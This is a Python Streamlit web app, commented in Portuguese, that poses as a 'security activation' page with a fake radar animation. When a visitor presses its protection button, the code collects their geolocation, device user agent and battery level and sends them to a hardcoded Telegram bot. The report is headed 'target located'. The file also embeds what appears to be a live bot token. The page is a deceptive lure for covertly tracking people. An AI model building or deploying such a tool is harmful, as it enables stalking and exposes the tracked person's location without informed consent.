import streamlit as st
import time
import requests
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. Suas Chaves (Não mexer aqui)
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except:
        pass

# 2. Configuração (Cadeado e Vírgula no lugar)
st.set_page_config(page_title="SEGURANÇA ATIVA", page_icon="🔐", layout="centered")

# 3. Estilo Visual
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: white; }
    .stButton>button {
        width: 100%; border-radius: 10px; height: 3.5em;
        background-color: #ffc107; color: black; font-weight: bold;
    }
    .radar {
        width: 150px; height: 150px; border: 4px solid #ffc107;
        border-radius: 50%; margin: 20px auto; animation: pulse 2s infinite;
    }
    @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
    </style>
    <div style="text-align: center;">
        <h1 style='color: #ffc107;'>🛡️ SEGURANÇA ATIVA</h1>
        <p>Monitoramento em Tempo Real</p>
        <div class="radar"></div>
    </div>
    """, unsafe_allow_html=True)

# 4. Dados do Sistema
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')

# 5. O BOTÃO QUE ENVIA (O segredo está aqui!)
if st.button("🔴 ATIVAR PROTEÇÃO"):
    loc = get_geolocation()
    if loc:
        with st.spinner("Enviando alerta..."):
            lat = loc['coords']['latitude']
            lon = loc['coords']['longitude']
            google_maps = f"https://www.google.com/maps?q={lat},{lon}"
            
            relatorio = (
                f"🔔 ALVO LOCALIZADO!\n\n"
                f"📱 Aparelho: {ua[:50]}...\n"
                f"🔋 Bateria: {bat}%\n"
                f"📍 Mapa: [Clique aqui para abrir]({google_maps})\n"
                f"🌐 Coordenadas: {lat}, {lon}"
            )
            
            enviar_telegram(relatorio)
            st.success("✅ Localização Enviada com Sucesso!")
    else:
        st.warning("⚠️ Por favor, clique em 'Permitir' no aviso de localização.")

st.markdown("<p style='text-align:center; color:grey; font-size:10px;'>Sistema de Segurança v3.0</p>", unsafe_allow_html=True)
